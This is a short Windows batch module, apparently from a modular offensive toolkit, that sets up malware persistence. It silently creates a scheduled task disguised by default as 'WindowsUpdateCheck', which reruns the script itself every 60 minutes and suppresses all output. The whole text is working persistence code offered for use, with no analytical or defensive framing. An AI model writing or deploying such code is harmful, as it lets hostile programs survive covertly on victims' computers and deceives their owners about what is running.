REM provides: persist_schtask
REM depends: (none)
REM description: Create a scheduled task for persistence

if not defined PERSIST_NAME set "PERSIST_NAME=WindowsUpdateCheck"
if not defined PERSIST_PATH set "PERSIST_PATH=%~f0"
if not defined PERSIST_INTERVAL set "PERSIST_INTERVAL=60"

schtasks /create /tn "%PERSIST_NAME%" /tr "\"%PERSIST_PATH%\"" /sc MINUTE /mo %PERSIST_INTERVAL% /f >nul 2>nul
